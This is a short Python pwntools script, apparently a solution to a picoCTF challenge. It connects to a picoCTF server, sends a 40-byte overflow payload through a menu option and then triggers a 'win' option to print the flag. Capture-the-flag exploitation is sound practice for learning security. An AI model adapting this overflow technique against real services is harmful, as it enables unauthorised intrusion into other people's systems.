from pwn import *

HOST = "tethys.picoctf.net"
PORT = 63058

p = remote(HOST, PORT)

# Sync to first menu
p.recvuntil(b"Enter your choice:")

# --- Step 1: Choose option 2 (write buffer) ---
p.sendline(b"2")
p.recvuntil(b"Data for buffer:")

# Overflow payload
payload = b"A" * 40
p.sendline(payload)
log.success(f"Sent overflow payload: {payload!r}")

# --- Step 2: Trigger win (option 4) ---
p.recvuntil(b"Enter your choice:")
p.sendline(b"4")

# --- Step 3: Receive the flag ---
print(p.recvall().decode())
